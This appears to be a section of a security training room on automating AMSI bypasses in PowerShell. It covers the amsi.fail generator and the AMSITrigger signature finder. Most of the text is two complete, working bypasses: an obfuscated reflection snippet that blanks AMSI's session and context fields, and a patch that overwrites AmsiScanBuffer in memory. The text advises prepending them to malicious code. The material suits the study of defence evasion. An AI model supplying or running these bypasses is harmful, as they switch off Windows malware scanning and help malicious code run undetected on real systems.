## Automating AMSI Bypass for Fun and Profit

While it is preferred to use the previous methods shown in this room, attackers can use other automated tools to break AMSI signatures or compile a bypass.

---

### amsi.fail

The first automation tool we will look at is **amsi.fail**.

**amsi.fail** compiles and generates a PowerShell bypass from a collection of known bypasses. According to its documentation:

> "AMSI.fail generates obfuscated PowerShell snippets that break or disable AMSI for the current process. The snippets are randomly selected from a small pool of techniques/variations before obfuscating. Every snippet is obfuscated at runtime/request so that no generated output shares the same signatures."

Below is an example of an obfuscated PowerShell snippet from amsi.fail:

```powershell
$d=$null;$qcgcjblv=[$(('Sys'+'tem').NoRMALizE([CHar](70*66/66)+[CHaR](77+34)+[cHaR]([bYTe]0x72)+[ChAR]([bYtE]0x6d)+[chaR](68*10/10)) -replace [cHAR](92)+[char]([ByTE]0x70)+[cHar]([bYtE]0x7b)+[Char](69+8)+[ChAr]([bYTE]0x6e)+[ChaR]([BYtE]0x7d)).Runtime.InteropServices.Marshal]::AllocHGlobal((9076+7561-7561));$pkgzwpahfwntq="+('lwbj'+'cymh').NORmaliZe([CHar]([byTe]0x46)+[char](111)+[ChAR]([ByTE]0x72)+[chaR](109*73/73)+[ChAR]([ByTE]0x44)) -replace [char]([bytE]0x5c)+[Char](112*106/106)+[char]([bYte]0x7b)+[chAR]([BYtE]0x4d)+[CHAR](110+8-8)+[CHAr]([BytE]0x7d)";[Threading.Thread]::Sleep(1595);[Ref].Assembly.GetType("$(('Sys'+'tem').NoRMALizE([CHar](70*66/66)+[CHaR](77+34)+[cHaR]([bYTe]0x72)+[ChAR]([bYtE]0x6d)+[chaR](68*10/10)) -replace [cHAR](92)+[char]([ByTE]0x70)+[cHar]([bYtE]0x7b)+[Char](69+8)+[ChAr]([bYTE]0x6e)+[ChaR]([BYtE]0x7d)).$(('Mãnâge'+'ment').NOrMalIzE([ChaR](70)+[chAR](111*105/105)+[cHAR](114+29-29)+[chaR]([bYtE]0x6d)+[CHAR](22+46)) -replace [cHar]([BytE]0x5c)+[CHar](112*11/11)+[chAR](123+34-34)+[CHAR](77*13/13)+[cHaR]([bYTe]0x6e)+[cHAR]([bYte]0x7d)).$(('Àutõmâtî'+'ôn').NoRMAlIZe([CHar]([bYTE]0x46)+[Char]([byte]0x6f)+[cHAR]([BYtE]0x72)+[cHAR](109+105-105)+[ChAr](68*28/28)) -replace [chAR]([BytE]0x5c)+[cHAr]([BYTE]0x70)+[CHAR]([BytE]0x7b)+[char]([byte]0x4d)+[CHaR]([BYte]0x6e)+[chaR](125+23-23)).$([CHAR]([ByTe]0x41)+[CHAr]([bYtE]0x6d)+[chaR](115*46/46)+[cHar]([BYTe]0x69)+[cHaR](85)+[CHAr](116)+[chAr](105*44/44)+[cHAr](108*64/64)+[chAr]([BYte]0x73))").GetField("$(('àmsí'+'Sess'+'íón').norMALiZE([CHaR](70*49/49)+[chAr](87+24)+[ChaR]([bytE]0x72)+[chAr](109)+[chAR](68+43-43)) -replace [CHAr](92)+[chAr]([byTe]0x70)+[CHAr]([bYTE]0x7b)+[cHAr](77*71/71)+[Char]([bYtE]0x6e)+[char](125+49-49))", "NonPublic,Static").SetValue($d, $null);[Ref].Assembly.GetType("$(('Sys'+'tem').NoRMALizE([CHar](70*66/66)+[CHaR](77+34)+[cHaR]([bYTe]0x72)+[ChAR]([bYtE]0x6d)+[chaR](68*10/10)) -replace [cHAR](92)+[char]([ByTE]0x70)+[cHar]([bYtE]0x7b)+[Char](69+8)+[ChAr]([bYTE]0x6e)+[ChaR]([BYtE]0x7d)).$(('Mãnâge'+'ment').NOrMalIzE([ChaR](70)+[chAR](111*105/105)+[cHAR](114+29-29)+[chaR]([bYtE]0x6d)+[CHAR](22+46)) -replace [cHar]([BytE]0x5c)+[CHar](112*11/11)+[chAR](123+34-34)+[CHAR](77*13/13)+[cHaR]([bYTe]0x6e)+[cHAR]([bYte]0x7d)).$(('Àutõmâtî'+'ôn').NoRMAlIZe([CHar]([bYTE]0x46)+[Char]([byte]0x6f)+[cHAR]([BYtE]0x72)+[cHAR](109+105-105)+[ChAr](68*28/28)) -replace [chAR]([BytE]0x5c)+[cHAr]([BYTE]0x70)+[CHAR]([BytE]0x7b)+[char]([byte]0x4d)+[CHaR]([BYte]0x6e)+[chaR](125+23-23)).$([CHAR]([ByTe]0x41)+[CHAr]([bYtE]0x6d)+[chaR](115*46/46)+[cHar]([BYTe]0x69)+[cHaR](85)+[CHAr](116)+[chAr](105*44/44)+[cHAr](108*64/64)+[chAr]([BYte]0x73))").GetField("$([chAR]([byTe]0x61)+[Char](109+52-52)+[cHar](46+69)+[CHar]([byTe]0x69)+[CHAR]([BYTe]0x43)+[Char]([ByTe]0x6f)+[chAR](110)+[chaR](116*47/47)+[cHar](101)+[CHAR]([bYte]0x78)+[CHaR]([ByTE]0x74))", "NonPublic,Static").SetValue($null, [IntPtr]$qcgcjblv);
```

You can attach this bypass at the beginning of your malicious code as with previous bypasses, or run it in the same session before executing malicious code.

---

### AMSITrigger

**AMSITrigger** allows attackers to automatically identify strings that are flagging signatures to modify and break them. This method of bypassing AMSI is more consistent than others because you are making the file itself clean.

The syntax for using amsitrigger is relatively straightforward; you need to specify the file or URL and what format to scan the file. Below is an example of running amsitrigger:

```shell
C:\Users\Tryhackme\Tools>AmsiTrigger_x64.exe -i "bypass.ps1" -f 3
```

#### Example PowerShell Bypass

```powershell
$MethodDefinition = "

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport(`"kernel32`")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
";

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, 'AmsiScanBuffer');
[UInt32]$Size = 0x5;
[UInt32]$ProtectFlag = 0x40;
[UInt32]$OldProtectFlag = 0;
[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);

[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);
```

Signatures are highlighted in red; you can break these signatures by encoding, obfuscating, etc.